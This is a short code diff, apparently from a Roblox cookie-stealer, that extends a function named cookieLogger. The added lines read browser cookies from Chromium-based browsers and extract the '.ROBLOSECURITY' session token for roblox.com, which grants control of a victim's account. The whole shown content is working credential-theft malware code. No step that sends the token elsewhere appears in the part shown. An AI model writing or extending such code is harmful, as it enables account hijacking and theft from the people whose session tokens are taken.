@@ -47,6 +47,13 @@ def cookieLogger():
                 data.append(cookies)
                 data.append(cookie.value)
                 return data
+    try:
+        cookies = browser_cookie3.chromium(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
     except:
         pass
 
